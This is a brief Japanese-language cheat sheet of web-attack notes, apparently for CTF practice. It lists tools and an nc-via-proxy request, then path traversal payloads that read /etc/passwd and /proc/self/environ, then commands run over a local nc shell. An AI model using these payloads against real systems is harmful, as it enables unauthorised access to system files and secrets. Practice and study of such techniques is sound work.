# Web

## ツール

- Wireshark
- Python
  - Scapy
  - dpkt
- nc

```bash
# -cで改行入力を待つ。-xでプロキシ経由
nc -c -X connect -x localhost:8080 localhost 80
GET / HTTP/1.1
Host: 127.0.0.1
```

## ディレクトリトラバーサル

```bash
../../../../../../../../../../etc/passwd
../../../../../../../../../../proc/self/environ
../../../../../../../../../../proc/self/cmdline
../../../../../../../../../../proc/self/maps
```

## 使えるコマンド

```bash
nc localhost 4444
exec id

# 情報取得
id
whoami
uname -a
ls -lahF
```
